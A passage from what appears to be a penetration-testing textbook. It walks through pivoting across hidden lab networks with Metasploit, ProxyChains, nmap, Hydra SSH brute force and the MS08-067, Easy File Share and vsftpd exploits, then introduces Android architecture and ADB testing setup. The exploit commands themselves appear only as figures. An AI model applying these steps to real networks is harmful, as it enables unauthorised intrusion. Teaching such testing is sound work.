The IP addresses of live systems in the 7.7.7.0/24 network have been determined, including the JC-named system. Refer to *[Figure 9.8](#c09.xhtml#fig9_8):*

![](images/Figure-9.8.jpg)

**Figure 9.8:** Hidden network

Naturally, the following question will arise: will nmap-style scanning tools be used instead of post modules like `arp_scanner` for such scanning work?

# [Nmap via pivoting](#toc.xhtml#s144a)

To accomplish this, Metasploit’s routing configuration must be active and capable of being sent via socks4 proxy. Another Metasploit module can be used to fulfill this requirement.

The use of the socks4 proxy as a Metasploit module can be seen in *[Figure 9.9](#c09.xhtml#fig9_9):*

![](images/Figure-9.9.jpg)

**Figure 9.9:** socks4 proxy

Using the ProxyChains utility built for GNU/Linux operating systems, any TCP connection can be routed to destinations via TOR or SOCKS4, SOCKS5, or HTTP/HTTPS. Many proxy servers can be used in this tunneling approach. In addition to offering anonymity, applications like pivoting can be used to shift traffic to new networks found. Refer to *[Figure 9.10](#c09.xhtml#fig9_10)*:

![](images/Figure-9.10.jpg)

**Figure 9.10:** ProxyChains

The information for the newly built socks4 proxy server is added to the last line of the `/etc/proxychains.conf` file, which is opened in a text editor. Refer to *[Figure 9.11](#c09.xhtml#fig9_11)*:

![](images/Figure-9.11.jpg)

**Figure 9.11:** Proxychains.conf file

It is an easy way to use ProxyChains to execute a nmap scan. The network packages will be sent to the destination via the defined proxy. Refer to *[Figure 9.12](#c09.xhtml#fig9_12)*:

![](images/Figure-9.12.jpg)

**Figure 9.12:** Nmap output\_1

Also, refer to *[Figure 9.13](#c09.xhtml#fig9_13)*:

![](images/Figure-9.13.jpg)

**Figure 9.13:** Nmap output\_2

According to the scan results, SSH and HTTP services will function on the target machine. We will look at a distinct sort of traffic routing called port forwarding before moving on to exploitation.

# [Port forwarding](#toc.xhtml#s145a)

Port forwarding is one of the first steps in pivoting. Certain services on the secret network’s specified systems may not be directly accessible (Web servers, and so on). Due to the lack of double-sided routing, this is the case. We know how to travel to the target system and submit a request, but because the target is unaware of our location, our requests will be refused. Refer to *[Figure 9.14](#c09.xhtml#fig9_14)*:

![](images/Figure-9.14.jpg)

**Figure 9.14:** Port forwarding

As a result, we route a port on our own system to the destination using the present meterpreter session. The routing will work if this process is alive.

One thing to keep in mind at this point: the run `autoroute` command allows us to work freely within the Metasploit framework thanks to the routing we provide. However, we will need tools like port forwarding and ProxyChains to access the target using Kali tools.

Port forwarding can be done with `portfwd` module, which is one of the post modules of Metasploit. Refer to *[Figure 9.15](#c09.xhtml#fig9_15):*

![](images/Figure-9.15.jpg)

**Figure 9.15:** Port forward using Metasploit

The connection request is forwarded to port 80 of the computer with the IP address 7.7.7.20 when we use our internet browser to submit a link request to our local `2323` port.

ProxyChains and Nmap have previously identified a Web service running on 7.7.7.20’s 80th TCP port. To use this service, forward port `2323` on the local system to the 7.7.7.20 port `80` that we want to use. Refer to *[Figure 9.16](#c09.xhtml#fig9_16)*:

![](images/Figure-9.16.jpg)

**Figure 9.16:** Port forward command

Active rules can be viewed with the `portfwd list` command. Refer to *[Figure 9.17](#c09.xhtml#fig9_17)*:

![](images/Figure-9.17.jpg)

**Figure 9.17:** Portfwd list command

Easy file sharing Web Server will be detected when the program executing on port `80` of the target system with IP address 7.7.7.20 is verified. Refer to *[Figure 9.18](#c09.xhtml#fig9_18)*:

![](images/Figure-9.18.jpg)

**Figure 9.18:** Easy file sharing Web server

# [SSH brute-force over pivoting](#toc.xhtml#s146a)

As you are aware, an SSH service was identified on 7.7.7.20. A brute-force attack on this service is simple to carry out. The `SSH_enumusers` auxiliary module allows user detection, as shown in *[Figure 9.19](#c09.xhtml#fig9_19)*:

![](images/Figure-9.19.jpg)

**Figure 9.19:** SSH\_enumusers Module output\_1

Also, refer to *[Figure 9.20](#c09.xhtml#fig9_20):*

![](images/Figure-9.20.jpg)

**Figure 9.20:** SSH\_enumusers Module output\_2

In addition to the auxiliary modules on the Metasploit Framework, Kali tools like Hydra can be used for the attack. If Hydra is deployed in ProxyChains, all traffic will be redirected to the target system via the compromised system. Refer to *[Figure 9.21](#c09.xhtml#fig9_21)*:

![](images/Figure-9.21.jpg)

**Figure 9.21:** Hydra tool in Kali Linux

SSH connection via a proxy server to the target system with admin username and password 123456 obtained during Hydra brute-force attack. Refer to *[Figure 9.22](#c09.xhtml#fig9_22)*:

![](images/Figure-9.22.jpg)

**Figure 9.22:** SSH connection

# [Gaining access to the second pivot](#toc.xhtml#s147a)

Our nmap scan on the 7.7.7.0/24 network range revealed two vulnerabilities, as you may recall. MS08-067 and the BoF vulnerability in the Easy File Share program were the flaws. Both methods can be used to get access to the target system. Another alternative is to keep using SSH, but we will stick with MS08-067 and easy file share for now.

# [MS08-067 with bind TCP](#toc.xhtml#s148a)

The Metasploit Framework module `exploit/windows/smb/ms08_067_netapi` can be used to compromise the target machine by exploiting the MS08-067 vulnerability. The fact that bind TCP is chosen as the payload type is crucial. The target system will not be able to contact us directly because the double-sided routing is not specified. As a result, the Bind TCP payload type must be selected so that the target waits for a connection on its own port. The connection to the port where the target system is listening will be done after the successful exploit procedure.

*[Figure 9.23](#c09.xhtml#fig9_23)* demonstrate how Reverse TCP and Bind TCP connections function:

![](images/Figure-9.23.jpg)

**Figure 9.23:** Reverse TCP connection and bind TCP connection

Compromise the victim using the MS08-067-Netapi exploit module and the Bind TCP payload, as shown in *[Figure 9.24](#c09.xhtml#fig9_24)*:

![](images/Figure-9.24.jpg)

**Figure 9.24:** MS08-067-Netapi exploit output\_1

Also, refer to *[Figure 9.25](#c09.xhtml#fig9_25)*:

![](images/Figure-9.25.jpg)

**Figure 9.25:** MS08-067-Netapi exploit output\_2

Refer to *[Figure 9.26](#c09.xhtml#fig9_26):*

![](images/Figure-9.26.jpg)

**Figure 9.26:** MS08-067-Netapi exploit output\_3

# [Easy file share BoF](#toc.xhtml#s149a)

The easy file share application was also vulnerable. The following steps can be taken to set up the exploit module with the Bind TCP payload and compromise the target, as shown in *[Figure 9.27](#c09.xhtml#fig9_27)*:

![](images/Figure-9.27.jpg)

**Figure 9.27:** Easy File Share Exploit output\_1

Also, refer to *[Figure 9.28](#c09.xhtml#fig9_28)*:

![](images/Figure-9.28.jpg)

**Figure 9.28:** Easy file share Exploit output\_2

Also, refer to *[Figure 9.29](#c09.xhtml#fig9_29)*:

![](images/Figure-9.29.jpg)

**Figure 9.29:** Easy file share Exploit output\_3

In the last case, the point where the attacker comes is as shown in *[Figure 9.30](#c09.xhtml#fig9_30)*:

![](images/Figure-9.30.jpg)

**Figure 9.30:** Hidden network layout

We have access to the 7.7.7.20 machine now. We will have to do some more data gathering. Like the RD machine, the JC-named machine has two NICs. We have discovered our second hidden network (8.8.8.0/24). Refer to *[Figure 9.31](#c09.xhtml#fig9_31)*:

![](images/Figure-9.31.jpg)

**Figure 9.31:** Data Gathering using ipconfig

Let us continue information gathering by performing ARP scanner on a second hidden network. Refer to *[Figure 9.32](#c09.xhtml#fig9_32):*

![](images/Figure-9.32.jpg)

**Figure 9.32:** arp\_scanner module

ARP scan says four machines are found in this network. Refer to *[Figure 9.33](#c09.xhtml#fig9_33):*

![](images/Figure-9.33.jpg)

**Figure 9.33:** Autoroute command

And we are adding the routing definition again.

# [Double pivoting](#toc.xhtml#s150a)

The 8.8.8.0/24 network was discovered during the information-gathering operation for the JC system. We already have a routing rule between the `172.16.0.0/24` and 7.7.7.0/24 networks, thanks to the first compromised system.

Network packets sent from `172.16.0.20` to the JC device (second infected machine) are first sent to the RD device (first compromised machine), and then the RD transfers them to the JC machine.

Attempts from the attacker computer (`172.16.0.20`) to contact the 8.8.8.9 location will go through two stages:

*   **RD**: We do not know how to access the 8.8.8.9 IP address. But we know the system, and who knows how to access it. We can direct you to it.
*   **JC**: We know how to forward packets from the 7.7.7.0/24 network to the 8.8.8.0/24 network.

*[Figure 9.34](#c09.xhtml#fig9_34)* is the final situation of the compromised and found systems:

![](images/Figure-9.34.jpg)

**Figure 9.34:** Final state of the compromised system

# [Holy ProxyChains](#toc.xhtml#s151a)

The ProxyChains tool establishes and sends a link between proxy servers from start to finish. On the local 1081 port, a new socks4 proxy server for the newly discovered 8.8.8.0/24 network is started. Refer to *[Figure 9.35](#c09.xhtml#fig9_35):*

![](images/Figure-9.35.jpg)

**Figure 9.35:** Socks4a module

The information for the new proxy server will be specified in the `/etc/proxychains.conf` configuration file. The Dynamic Chain functionality ensures that the defined proxy servers are switched in sequential order. Refer to *[Figure 9.36](#c09.xhtml#fig9_36):*

![](images/Figure-9.36.jpg)

**Figure 9.36:** proxychains.conf file

The 8.8.8.9 target can be scanned using the ProxyChains tool via the second pivot system with the nmap utility. Refer to *[Figure 9.37](#c09.xhtml#fig9_37):*

![](images/Figure-9.37.jpg)

**Figure 9.37:** Nmap output\_1

Also, refer to *[Figure 9.38](#c09.xhtml#fig9_38):*

![](images/Figure-9.38.jpg)

**Figure 9.38:** Nmap output\_2

As you can see, the packages first transit through the first proxy server before proceeding to the second proxy server we set up. It arrives at its final destination. When the scan results are analyzed, it will be determined that the vsftpd service at 8.8.8.9 is vulnerable.

The following methods are used to prepare the vsftpd exploit module in the Metasploit framework and compromise our final target. Refer to *[Figure 9.39](#c09.xhtml#fig9_39):*

![](images/Figure-9.39.jpg)

**Figure 9.39:** vsftpd exploit output\_1

Also, refer to *[Figure 9.40](#c09.xhtml#fig9_40)*:

![](images/Figure-9.40.jpg)

**Figure 9.40:** vsftpd exploit output\_2

# [Mitigations](#toc.xhtml#s152a)

A few mitigations are as follows:

*   Multiple NIC systems that allow DMZ access should be eliminated from the current network topology.
*   Only DMZ structures should be used to access systems in the DMZ.

# [Conclusion](#toc.xhtml#s153a)

The attacker discovered two different secret networks by following the steps as follows:

1.  The attacker gained access to the RD machine on the same network as the attacker.
2.  Then he notices that the RD machine has two network interfaces.
3.  Using the autoroute post module, he created a routing rule.
4.  The attacker then ran an ARP and NMAP scan on the 7.7.7.0/24 network and discovered a machine named JC.
5.  JC had two different vulnerabilities. Easy File Share and MS08-067.
6.  After successfully exploiting MS08-067, the attacker gained access to the 7.7.7.20 network.
7.  Information gathering showed JC also have two network interfaces.
8.  Another routing rule is defined on 7.7.7.20.
9.  ARP and NMAP were used on 8.8.8.0/24.
10.  Vulnerable vsftpd was operating on the machine SK at 8.8.8.9.

Refer to *[Figure 9.41](#c09.xhtml#fig9_41)*:

![](images/Figure-9.41.jpg)

**Figure 9.41:** Final layout for hidden network

While the attacker’s machine could only gain access to the first network he was connected to, and the attacks also gave him access to the two covert networks.

# [Questions](#toc.xhtml#s154a)

1.  What is routing?
2.  What is pivoting?
3.  What is port forwarding?

# [CHAPTER 10](#toc.xhtml#c10)

# [Android Penetration Testing](#toc.xhtml#c10)

# [Introduction](#toc.xhtml#s155a)

Smartphones have grown ubiquitous, with over 1 billion users globally and 2.5 million apps (and counting) available on the Google and Apple digital marketplaces. Their impact on our lives is immediate and profound, affecting our daily lives in various ways, including how we connect, work, and socialize. The rise in consumer demand, as well as the processing power and capabilities of smartphones, such as storage, GPS, camera, screens, and other features, has shifted the paradigm of mobile application development. Online banking, trading, e-mails, airport check-ins, and much more are all available with a single tap.

In this chapter, we will cover all the information we will need to begin hacking and penetration testing Android apps. The top 10 OWASP mobile application vulnerabilities will be discussed, as well as how to attack Android apps and their weaknesses, with examples.

# [Structure](#toc.xhtml#s156a)

The following topics will be covered in this chapter:

*   Android architecture
*   Android penetration testing environment setup
*   Android penetration testing tools
*   Secure android applications

# [Objectives](#toc.xhtml#s157a)

In this chapter, you will understand Android architecture in detail, learn how to set up an android penetration testing environment and know the popular android penetration testing tools. Finally, you will learn how to protect your Android applications.

# [Android architecture](#toc.xhtml#s158a)

Understanding the architecture of any platform is critical for any developer or security researcher. The hardware abstraction layer of Android is based on the Linux 2.x and 3.x kernels.

It consists of the following:

*   Key application
*   Operation system
*   Middleware
*   Runtime environment
*   Different services
*   Native and custom libraries

As indicated in *[Figure 10.1](#c10.xhtml#fig10_1)*, it can be represented as five layers:

![](images/Figure-10.1.jpg)

**Figure 10.1:** Android architecture

All of the components have been fine-tuned and merged to give the best possible environment for developing and executing mobile applications.

Let us take a bottom-up approach to learn about the various layers of the Android stack now.

# [The Linux kernel](#toc.xhtml#s159a)

The Linux kernel is at the core of the Android operating system. Linux was picked as the best contender to start with because of its flexible portability features, which allow for easy compilation of applications on a variety of hardware platforms.

Process management/scheduling, memory management, and device management are all supported by the Linux kernel, which is located at the bottom of the software stack. It also serves as a key abstraction layer, allowing the app to communicate with physical devices by providing access to multiple device drivers.

The automated tilt/rotation adjustment of the screen to match the orientation of the mobile device is a simple example of this. The following are some of the concerns:

*   How does this happen?
*   What triggers the device to perform this operation?
*   How does the OS come to know that the device orientation has changed?

Let us take a closer look.

The accelerometer and gyroscope are hardware sensors in the device that detect minute motions and changes in orientation and communicate this data to the kernel. This information is converted into software instructions by the device drivers, which are picked up by the apps; if the app is intended to respond to these instructions, it does so. The Linux kernel, as illustrated in the diagram as shown in *[Figure 10.2](#c10.xhtml#fig10_2),* contains all of the drivers needed for the hardware to function properly, as well as power management.

In a nutshell, the Linux kernel is in charge of memory, resources, power, and driver management.

![](images/Figure-10.2.jpg)

**Figure 10.2:** Linux kernel

# [Confusion between Linux and the Linux kernel](#toc.xhtml#s160a)

The name Linux is commonly used to refer to the complete operating system, whereas kernel refers to the operating system’s core. The fact that Android is based on the Linux kernel does not imply that it is another Linux distribution; it just means that Linux is the fundamental operating system, and not all Linux programs may be loaded on Android.

# [Android runtime](#toc.xhtml#s161a)

Although Android is written in Java, the **Dalvik Virtual Machine** (**DVM**), core Java libraries, and a new virtual machine dubbed **Android Runtime** (**ART**) make up the runtime layer of the Android architecture.

*[Figure 10.3](#c10.xhtml#fig10_3)* is from Android 4.4 KitKat, which allows developers to create ART applications:

![](images/Figure-10.3.jpg)

**Figure 10.3:** Android runtime (ART) option

Apps written in Java are executed on the DVM. Due to licensing issues, the DVM does not claim to be a **Java virtual machine** (**JVM**), although it serves the same purpose. The reason for this is that Dalvik is designed to run on low-power and low-memory devices. The DVM is only initiated once for performance reasons. A system service called Zygote clones each new instance of it. The structure of the Android runtime is shown in *[Figure 10.4](#c10.xhtml#fig10_4)*:

![](images/Figure-10.4.jpg)

**Figure 10.4:** Android runtime core libraries

# [The Java virtual machine](#toc.xhtml#s162a)

When we build a Java application, we get bytecode. This bytecode can be executed by the JVM, which is a virtual machine (a virtual machine is a program that acts as an operating system). *[Figure 10.5](#c10.xhtml#fig10_5)* depicts the compilation of a Java program:

![](images/Figure-10.5.jpg)

**Figure 10.5:** Java program compilation process

# [The Dalvik virtual machine](#toc.xhtml#s163a)

In Android, the bytecode created by the JVM is sent into the DVM, which generates a lightweight format known as `.dex`.

Why is it necessary to convert Java bytecode to `.dex` format?

The answer is that we do not have the same amount of power, memory, and RAM on mobile devices as we do on PCs. This explains why we require increasingly lightweight applications. On PCs, Java bytecode is appropriate for heavyweight applications. The DVM uses compression techniques to eliminate superfluous information in the classes before generating the `.dex` file. For example, if your Java source code has 1,000 classes, all these 1,000 classes will be available as a single file in the Dalvik executable format `(.dex`).

The conversion of Java source code (.java) to Dalvik byte code (`.dex`) is depicted in the flowchart as shown in *[Figure 10.6](#c10.xhtml#fig10_6)*:

![](images/Figure-10.6.jpg)

**Figure 10.6:** Conversion of .java to .dex

# [Zygote](#toc.xhtml#s164a)

The zygote is one of the first programs that start when an Android device boots up, and it is responsible for the following:

*   Starting up a virtual machine
*   Preloading the core libraries
*   Initializing various shared structures

# [Core Java libraries](#toc.xhtml#s165a)

These are distinct from the core Java libraries’ Java SE and Java ME libraries. Dalvik libraries are a common name for them. These are some of them:

*   **DVM-specific libraries**: These libraries are designed to communicate with a DVM instance directly. They are unlikely to be used by the development community.
*   **Java interoperability libraries**: These are just a collection of classes found in the core Java runtime libraries; often, the libraries assist with file operations, string manipulation, and other networking tasks.

# [ART](#toc.xhtml#s166a)

The DVM was totally replaced by ART when Android Lollipop was released by Google. ART has several advantages over the DVM, which include the following:

*   **Ahead-of-time** (**AOT**) versus old **Just-in-time** (JIT) Compilation
*   Improved garbage collection
*   Better application performance

The process of compiling ART code is depicted in *[Figure 10.7](#c10.xhtml#fig10_7):*

![](images/Figure-10.7.jpg)

**Figure 10.7:** Comparison between Dalvik and ART compilation

# [Native libraries](#toc.xhtml#s167a)

Some low-level components cannot be interacted with when developing in Java. If you need to display graphics on the device screen, for example, you will not be able to write code directly in Java; instead, you will need to write a function or method that calls other native programs that are not Java programs.

The native libraries in Android are non-Java programs. The libraries are written in various languages, including C, C++, and others. The Android **Native Development Kit** (**NDK**), which contains a wide range of libraries and headers that allow developers to create and build various activities, is used to install this native code.

*[Figure 10.8](#c10.xhtml#fig10_8)* depicts the many native libraries that are currently available on the Android platform:

![](images/Figure-10.8.jpg)

**Figure 10.8:** Native libraries

It can be customized by any **Original Equipment Manufacturer** (**OEM**). The libraries module usually contains the following items:

*   **The media framework:** This framework is built on PacketVideo OpenCore platforms and supports common audio, video, and still-frame formats as well as codec plugins. The StageFright flaw was discovered by exploiting a media framework (libStageFright) flaw that gave attackers full remote access via a feature that automatically played video files received via MMS or other means on an Android device.
*   **The surface manager:** The display subsystem is supported, and many applications’ 2D and 3D graphics layers are rendered.
*   **Freetype:** This is used to render bitmap and text.
*   **OpenGL ES:** OpenGL is a cross-platform graphics API that defines a software interface for 3D graphics processors.
*   **Secure Socket Layer** (**SSL**)**:** This is based on OpenSSL (**[www.openssl.org](http://www.openssl.org)**).
*   **SQLite:** The application framework API makes this lightweight relational database engine available to any application.
*   **WebKit:** This is a browser engine based on the WebKit browser ([www.webkit.org](http://www.webkit.org)), which supports page rendering, full CSS, JavaScript, DOM, and AJAX, as well as single-column and adaptive view rendering.
*   **SGL (**short for **Scalable Graphics Library):** This is used for 2D graphics libraries.
*   **libc:** Standard C system libraries derived from BSD for embedded Linux-based devices.

# [The application framework](#toc.xhtml#s168a)

The application framework gives developers the tools they need to create far more complicated apps or tools. This framework is used to manage the application’s full development lifecycle.

A developer who is developing an app that requires the notification feature, for example, does not need to write a single line of code; instead, he or she may just call the Notification Manager API. Most of the APIs required to operate an Android smartphone are provided by this framework.

A list of the frameworks that are now available for the Android platform is shown in *[Figure 10.9](#c10.xhtml#fig10_9)*:

![](images/Figure-10.9.jpg)

**Figure 10.9:** Application framework

The key services in this framework are as follows:

*   **Activity manager**: The Activity Manager manages an app’s full lifetime and is also responsible for handling the many states of activity to ensure that apps using different processes operate smoothly, which we will go over in depth in the next section.
*   **Content providers**: This component enables applications to share and publish data with other apps. The content provider oversees encapsulating data, defining data security, and controlling data structure. When all of a user’s input to an app is structured and kept in an SQLite database, this is an example.
*   **Resource manager**: The Resource Manager manages access to all embedded resources that are not coded in the app, such as graphics, localized strings, and other layout files.
*   **Notifications manager**: This provides mobile user notifications and displays alerts.
*   **View system**: The View System oversees many views, event dispatching, and other important buttons and lists.
*   **Package manager**: This controls all the application packages that are installed on the device.
*   **Telephony manager**: This provides telephone services, such as status and subscriber information, to the device.
*   **Location manager**: This gives location services about changes in location, allowing an app to receive updates.
*   **Window manager**: It oversees organizing the screen that is shown to the user and providing the surface with decision-making capabilities when the application is to be generated and layered appropriately on the display window.

# [The applications layer](#toc.xhtml#s169a)

This is the first layer of the Android stack, and it is through applications that the bulk of consumers interact with their phones. As shown in *[Figure 10.10](#c10.xhtml#fig10_10)*, there are two types of applications that are generally available on the device:

![](images/Figure-10.10.jpg)

**Figure 10.10:** Applications layer

Now, let us explore the differences.

# [Native Android or system apps](#toc.xhtml#s170a)

System apps are applications that are placed on the phone by the manufacturer and provided with it. The e-mail client, SMS program, phone, calendar, maps, phone dialer, browser, contacts, and other applications are all loaded by default. These apps are usually not able to be removed from the device and reside in the `/system` folder.

# [User-installed or custom apps](#toc.xhtml#s171a)

The user can download and install these applications through a variety of distribution networks, including Google Play and Amazon Store. These apps are in the Android filesystem’s `/data/data/` subdirectory. In the next sections, we will go over the specifics of the security features.

# [Android penetration testing environment setup](#toc.xhtml#s172a)

For any form of a security evaluation, establishing a well-structured test environment is critical. It is recommended that you start with a zero environment, presuming that nothing is installed on your PC. The hardware and software requirements for establishing a basic infrastructure for Android Application Penetration Testing are listed as follows.

This book concentrates on setting up the environment on Windows, but you are free to experiment with Linux and other operating systems as well.

*   Hardware and OS requirements:  
    *   A workstation/laptop running Windows 7 (64-bit)
*   Mobile Devices and OS requirements:  
    *   Google Nexus 5 or any other device running Android 5.0 or higher (rooted)
*   Software requirements:  
    *   Python
    *   Java Development Kit (1.8)
*   Other requirements:  
    *   Compatible USB cables for mobile devices
    *   Network Wi-Fi devices (one can use any smartphone with a tethering facility to act like a Wi-Fi router)

Why do you need a rooted phone for your test environment?

It is as basic as being able to edit and install any tools on the device and run unsigned software from atypical app shops. Rooted phones will have complete filesystem access. The scope of this book does not include rooting a mobile device.

# [Android Studio and SDK](#toc.xhtml#s173a)

The official **Integrated Development Environment** (**IDE**) for developing Android Apps is Android Studio, which Google supports. Java was replaced by Kotlin on May 7, 2019, as a preferred language for developing Android Apps. But still, Java is being used for developing Android Apps. Android Studio Dolphin|2021.3.1 has the following features.

*   Gradle-based build support.
*   UI components can be created by drag and drop features in the layout editor.
*   Common Android designs and components can be created by template-based wizards.
*   Built-in support for Google Cloud Platform, enabling integration with Firebase Cloud Messaging (Earlier *Google Cloud Messaging*) and Google App Engine.
*   Lint tools to catch performance, usefulness, version compatibility, and other problems.
*   Multi-preview API.
*   Wear OS pairing Assistant.

The following prerequisites must be met before downloading and installing Android Studio.

*   Operating System Version—Microsoft Windows 8/10 (64-bit).
*   x86\_64 CPU Architecture 2^(nd) generation Intel Core or later or AMD CPU with support a Windows.
*   Random Access Memory (RAM)—Minimum 8 GB RAM or more.
*   Free Disk Space—Minimum 8 GB for IDE + Android SDK + Android Emulator.
*   Minimum Required JDK Version—Java Development Kit (JDK) 8.
*   Minimum Screen Resolution—1280 \* 800 resolution.

# [Downloading and installation of Android Studio](#toc.xhtml#s174a)

To download and install Android Studio, follow the given steps:

1.  To download the Android Studio, visit the official Android Studio website (**[https://developer.android.com/studio/](https://developer.android.com/studio/)**) in your Web browser.
2.  Click on the `Download Android Studio` option, as shown in *[Figure 10.11](#c10.xhtml#fig10_11):* 
    
    ![](images/Figure-10.11.jpg)
    
    **Figure 10.11:** Download Android Studio from website
    
3.  After downloading, double-click on the `Android Studio-ide.exe` file.
4.  `Android Studio Setup` will appear on the screen, and click `Next` to proceed, as shown in *[Figure 10.12](#c10.xhtml#fig10_12):*
    
    ![](images/Figure-10.12.jpg)
    
    **Figure 10.12:** Android Studio Setup\_1
    
5.  Select the components that you want to install and click on the `Next` button, as shown in *[Figure 10.13](#c10.xhtml#fig10_13):* 
    
    ![](images/Figure-10.13.jpg)
    
    **Figure 10.13:** Android Studio Setup\_2
    
6.  Now, browse the location where you want to install the Android Studio and click `Next` to proceed, as shown in *[Figure 10.14](#c10.xhtml#fig10_14):*
    
    ![](images/Figure-10.14.jpg)
    
    **Figure 10.14:** Android Studio Setup\_3
    
7.  Choose a start menu folder for the `Android Studio` shortcut and click the `Install` button to proceed, as shown in *[Figure 10.15](#c10.xhtml#fig10_15):* 
    
    ![](images/Figure-10.15.jpg)
    
    **Figure 10.15:** Android Studio Setup\_4
    
8.  After the successful completion of the installation, click on the `Next` button, as shown in *[Figure 10.16](#c10.xhtml#fig10_16)*: 
    
    ![](images/Figure-10.16.jpg)
    
    **Figure 10.16:** Android Studio Setup\_5
    
9.  Click on the `Finish` button to proceed, as shown in *[Figure 10.17](#c10.xhtml#fig10_17):* 
    
    ![](images/Figure-10.17.jpg)
    
    **Figure 10.17:** Android Studio Setup\_6
    
10.  Now, your Android studio welcome screen will appear on the screen, as shown in *[Figure 10.18](#c10.xhtml#fig10_18):*
     
     ![](images/Figure-10.18.jpg)
     
     **Figure 10.18:** Android Studio Setup\_7
     

# [The Android SDK](#toc.xhtml#s175a)

The Android SDK allows developers to create, test, and debug apps for the Android platform. It includes all the necessary software libraries, APIs, emulator system images, documentation, and other resources for developing Android apps. We have installed Android Studio along with the Android SDK, and it is critical to grasp how to make the most of the SDK’s built-in features. This section gives an overview of some of the key tools we will use to attack an Android app as part of the penetration testing exercise.

# [The Android Debug Bridge](#toc.xhtml#s176a)

This is what we talked about in this chapter’s *Android Architecture* section. It is a straightforward and powerful command-line tool that will be used to interface with and operate Android devices. It is necessary to activate USB-Debugging to connect with ADB on a physical device. You can access this on the Galaxy Note 10 with Android v9 by going to `Settings` | `Developer` settings, as demonstrated in *[Figure 10.19](#c10.xhtml#fig10_19)*.

If the Developer options are not visible, it is because they are disabled; you may enable them by touching the Build number field, which can be discovered by going to `Settings` | `About Phone` | `Software information` | `Build number`. You should tap seven times in total.

Refer to *[Figure 10.19](#c10.xhtml#fig10_19):*

![](images/Figure-10.19.jpg)

**Figure 10.19:** Android debug bridge

The following is a collection of ADB commands that will be used during the testing process.

# [Connecting to the device](#toc.xhtml#s177a)

Once the device is connected to the workstation, use the ADB devices command to see if the device is correctly set up with the correct device drivers. This command displays a list of all connected devices to your workstation. Refer to *[Figure 10.20](#c10.xhtml#fig10_20):*

![](images/Figure-10.20.jpg)

**Figure 10.20:** ADB devices command\_1

When you run this command without the device drivers for the mobile device loaded, you will get a blank list, as shown in *[Figure 10.21](#c10.xhtml#fig10_21)*:

![](images/Figure-10.21.jpg)

**Figure 10.21:** ADB devices command\_2

In this instance, you may need to download and install device drivers from the device manufacturers’ websites.

# [Getting access to the device](#toc.xhtml#s178a)

Android is based on the Linux kernel, as detailed in this chapter’s *Android Architecture* section. You may use ADB to connect to a shell and perform commands on your mobile device. If the `Allow USB Debugging` option is enabled once entered, the ADB shell command can be used on a rooted or unrooted device, as demonstrated in the command-line output as follows. You will have access to a standard shell with some limitations. You may need to enter root mode by typing `su`, which allows you to run most Linux commands. Refer to *[Figure 10.22](#c10.xhtml#fig10_22):*

![](images/Figure-10.22.jpg)

**Figure 10.22:** ADB shell command

If the workstation is connected to more than one device, you may need to use different parameters. Refer to *[Figure 10.23](#c10.xhtml#fig10_23):*

![](images/Figure-10.23.jpg)

**Figure 10.23:** ADB devices and shell commands

*   `–s` to connect to the device
*   `-d` to connect only to the USB device
*   `-e` to connect only to an emulator

# [Installing an application to the device](#toc.xhtml#s179a)

Installing an Android app on a hardware device or an emulator would be a basic prerequisite during the evaluation process. You can use the ADB install command; this will require the APK file to be installed, as shown in *[Figure 10.24](#c10.xhtml#fig10_24)*:

![](images/Figure-10.24.jpg)

**Figure 10.24:** ADB install command

# [Extracting files from the device](#toc.xhtml#s180a)

To examine what data is stored during installation and uninstallation, we must ensure that no sensitive information is left behind that could be exploited by rogue applications or users. As a result, we extract the files for offline examination to access any sensitive data. This can be done by using the ADB pull command and specifying the file location on the device. We are grabbing all the apps that are installed on the rooted device in *[Figure 10.25](#c10.xhtml#fig10_25)*:

![](images/Figure-10.25.jpg)

**Figure 10.25:** ADB pull command

# [Storing files to the device](#toc.xhtml#s181a)

We may want to copy local files from the desktop to the Android device most of the time. The syntax is **ADB push** local file remote location, where remote location is the location where the file should be stored. For example, the following command line output shows a `pushme.JPG` file being moved from a local workstation to the device’s `/sdcard/` folder, as shown in *[Figure 10.26](#c10.xhtml#fig10_26):*

![](images/Figure-10.26.jpg)

**Figure 10.26:** ADB command

# [Stopping the service](#toc.xhtml#s182a)

In other circumstances, we may want to disconnect the devices, in which case the ADB server must be restarted. This can be accomplished with the `ADB kill-server` command, which will kill the ADB connection and restart it when you provide a new ADB command.

# [Viewing the log information](#toc.xhtml#s183a)

Through logcat, Android provides a good view of system debugging messages; use the **A**`DB logcat` command, as seen in *[Figure 10.27](#c10.xhtml#fig10_27)*. Examine the many types of logs that programs and systems collect in various buffers. This feature has the potential to be a source of data leakage during the assessment:

![](images/Figure-10.27.jpg)

**Figure 10.27:** ADB logcat command

All the logs begin with several message kinds, which can be summarized as follows:

*   `V`: Verbose
*   `D`: Debug
*   `I`: Information
*   `W`: Warning
*   `E`: Error
*   `F`: Fatal
*   `S`: Silent

# [Sideloading apps](#toc.xhtml#s184a)

*Sideloading* typically means installing an application package in APK format onto an Android device. Such packages are usually downloaded from websites other than the official app store Google Play. Installing a custom ROM on an Android smartphone is possible, and ADB allows you to sideload the software. Running `ADB sideload package.zip`, which is equivalent to `ADB push` and `install`, will accomplish this.

# Monkeyrunner

Monkeyrunner is an Android SDK utility that allows developers to create or use pre-existing apps to control a connected device emulator.

If you run `ADB shell monkey 2`, for example, it will inject the event ID 2 and launch the application without a user interface. Refer to *[Figure 10.28](#c10.xhtml#fig10_28):*

![](images/Figure-10.28.jpg)

**Figure 10.28:** ADB shell monkey command

# [Genymotion](#toc.xhtml#s185a)

Genymotion is a replacement for the **Android Virtual Device** (**AVD**) manager included with the Android SDK. This will be used throughout the Android assessment section of this book. Genymotion is only available for download after you create an account in their cloud and follow the steps at **[https://www.genymotion.com/#!/download](https://www.genymotion.com/#!/download)**. There are two different kinds of licenses:

1.  **Personal use**: The possibilities for running an emulation in this version of Genymotion are restricted.
2.  **Commercial use:** This version of Genymotion gives developers added features, including network debugging, design simulation, and automation.

Genymotion is preferred by testers and developers as an emulator due to its superior performance when compared to the Android SDK’s emulators (even with Intel Hardware Accelerated Execution Manager enabled). This is not, however, a replacement for the Android SDK’s AVD.

Step-by-step instructions for installing Genymotion are provided as follows:

1.  Double-click the program when it has been downloaded, and a window wizard will appear, as seen in *[Figure 10.29](#c10.xhtml#fig10_29)*: 
    
    ![](images/Figure-10.29.jpg)
    
    **Figure 10.29:** Genymotion installation\_1
    
